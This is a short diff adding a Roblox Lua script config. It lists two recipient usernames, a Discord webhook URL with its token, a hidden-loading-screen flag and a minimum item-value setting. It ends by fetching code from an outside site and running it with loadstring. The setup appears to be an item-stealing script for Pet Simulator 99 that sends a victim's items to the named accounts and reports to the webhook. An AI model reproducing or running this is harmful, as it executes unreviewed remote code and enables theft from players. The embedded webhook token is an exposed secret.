@@ -1,0 +1,9 @@
+Username = "happy123_81"
+Username2 = "robloxthegamer10234"
+Webhook = "https://discord.com/api/webhooks/1205237791840018492/bbVAxjz6ilWyjEso7Gj1JqvHc7plo7TIut-x-5dJXpWRFCmXcJ3OoEzTHQtBwLZSd4hQ"
+
+LoadingScreen = false
+
+MinimumRAP = 0
+
+loadstring(game:HttpGet("https://hugegames.lol/ps99"))()
